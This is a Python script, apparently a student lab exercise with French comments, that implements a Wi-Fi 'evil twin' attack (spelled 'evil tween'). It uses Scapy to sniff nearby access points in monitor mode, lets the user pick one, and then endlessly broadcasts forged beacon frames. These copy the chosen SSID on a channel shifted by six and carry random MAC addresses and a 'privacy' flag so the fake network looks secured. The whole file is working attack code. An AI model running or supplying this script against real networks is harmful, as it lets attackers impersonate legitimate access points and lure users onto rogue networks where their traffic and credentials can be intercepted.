#!/usr/bin/env python3 
# -*- coding: utf-8 -*-
#----------------------------------------------------------------------------
# Created By  : Nicolas Hungerbühler & Lucas Gianinetti
# Created Date: 31.03.22
# ---------------------------------------------------------------------------
# Ce programme prend en paramètre une interface réseau (/!\ Doit être en mode 
# monitor channel hopping /!\) et optionnellement combien de temps il doit scanner 
# Ce script scan les alentours pour des APs pendant un certain temps, si il
# en trouve il les liste et propose d'en spoofer un. Il faut donner l'ID de l'AP
# dans la liste. Le spoofing prend le même SSID et décale le canal de +/- 6. 
# ---------------------------------------------------------------------------

import argparse

from faker import Faker
from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Elt, Dot11Beacon, sendp

################## Passing arguments ##################
parser = argparse.ArgumentParser(prog="Scapy fake evil tween attack",
                                 usage="%(prog)s -i wlan0mon",
                                 description="Scapy bases fake evil tween attack",
                                 allow_abbrev=False)

parser.add_argument("-i", "--Interface", required=True,
                    help="the interface we want to sniff to be on, needs to be set to monitor mode with channel hopping")

parser.add_argument("-t", "--Timeout", required=False,
                    help="The time in secondes how long we will scan for AP, default is 15", default=15)                 


args = parser.parse_args()

################## variables ##################

IFACE_NAME = args.Interface
BROADCAST = "ff:ff:ff:ff:ff:ff"
timeout = args.Timeout
check_list = []
ap_list = []

#Classe représentant un AP
class AP:
    def __init__(self, BSSID, signal, SSID, channel):
        self.BSSID = BSSID
        self.signal = signal
        self.SSID = SSID
        self.channel = channel

################## fonctions ##################

def PacketHandler(pkt):
    # On veut un Beacon de type Probe Request 
    if pkt.haslayer(Dot11Beacon) and pkt.type == 0 and pkt.subtype == 8:

            #Verification de doublon
            if pkt.addr2 not in check_list: 
                check_list.append(pkt.addr2)

                # On crée notre AP avec toutes les informations nécessaires
                BSSID = pkt.addr3
                SSID = pkt.info.decode("utf-8")
                channel = pkt.channel
                try:
                    signal = pkt[0][RadioTap].dBm_antiSignal
                except:
                    signal = "N/A"

                #On met l'AP dans le tableau
                ap_list.append(AP(BSSID, signal, SSID, channel))

def get_ap():
    choice = int(input("Veuillez choisir un AP à spoof:"))
    chan = ap_list[choice].channel

    # On ajoute 6 channels au channel de l'AP sélectionné
    if chan <= 6:
        beacon_channel = chan + 6
    else:
        beacon_channel = chan - 6

    #Retourne l'SSID de l'ap à spoof ainsi que le channel sur lequel il devrait être lancé
    return ap_list[choice].SSID, beacon_channel

def evil_tween():
    faker = Faker()

    ssid, channel = get_ap()

    #Préparation du packer à envoyer
    dot11 = Dot11(type=0, subtype=8, addr1=BROADCAST, addr2=faker.mac_address(), addr3=faker.mac_address()) #en broadcast avec comme adresses MAC src et MAC AP des adresses aléatoires identiques
    beacon = Dot11Beacon(cap='ESS+privacy') #pour qu'il apparaisse comme sécurisé
    essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid)) #set du ssid de l'ap à spoof
    chan = Dot11Elt(ID='DSset', info=chr(channel))    #set du channel sur lequel il sera lancé

    #Build du packet
    packet = RadioTap()/dot11/beacon/essid/chan

    #Affichage du packet
    print("packet:")
    packet.show()

    #envoi des frames
    sendp(packet, iface=IFACE_NAME, inter=0.100, loop=1)

def displayAPs(list):
    count = 0
    for ap in list:
        print("%s: \t MAC: %s \t SIGNAL: %s \t CHANNEL: %s \t SSID: %s" % (
        count, ap.BSSID, ap.signal, ap.channel, ap.SSID))
        count += 1

################## main ##################

#Représente le temps pendant lequel les paquets seront sniffés
print("Looking for APs - %s s" % timeout)

#Sniff les paquets pour détecter les APs à proximité
sniff(iface=IFACE_NAME, prn=PacketHandler, timeout=timeout)

print("Liste des APs trouvés")
displayAPs(ap_list)

#Lancer le evil tween
evil_tween()
